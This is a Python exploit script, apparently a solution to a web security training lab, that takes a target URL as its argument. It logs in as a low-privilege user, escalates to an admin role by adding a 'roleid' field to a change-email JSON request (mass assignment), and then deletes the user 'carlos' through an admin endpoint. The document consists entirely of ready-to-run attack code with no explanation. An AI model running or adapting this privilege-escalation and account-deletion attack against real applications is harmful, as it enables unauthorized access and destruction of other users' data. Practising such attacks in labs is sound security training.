import requests
import sys


def login(url):
    session = requests.Session()
    print("(+) Logging in as user Wiener...")
    login_page = url + "/login"
    credentials = {"username": "wiener","password": "peter"}
    response = session.post(login_page, data=credentials)
    if response.status_code == 200:
        print("(+) Logged in successfully")
        return session
    else:
        print("(-) Could not log in.")
        print("(-) Exiting...")
        sys.exit(1)

def change_id(url,session):
    change_id_url = url + "/my-account/change-email"
    print("(+) Changing roleid to 2...")
    change_id_payload = {"email": "test@test.com", "roleid": 2}
    response = session.post(change_id_url, json=change_id_payload)
    if response.status_code == 200:
        print("(+) Changed role id successfully!")
    else:
        print("(-) Could not change roleid")
        print("(-) Exiting...")
        sys.exit(1)

def delete_user(url,session):
    delete_user = url + "/admin/delete?username=carlos"
    print("(+) Deleting user Carlos...")
    response = session.get(delete_user)
    if response.status_code == 200:
        print("(+) Deleted user Carlos successfully")
    else:
        print("(-) Could not delete User Carlos.")
        print("(-) Exiting...")
        sys.exit(1)
    

def main(): 
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    else:
        print("(+) Starting the script...")
        url = sys.argv[1]
        session = login(url)
        change_id(url, session)
        delete_user(url, session)

if __name__ == "__main__":
    main()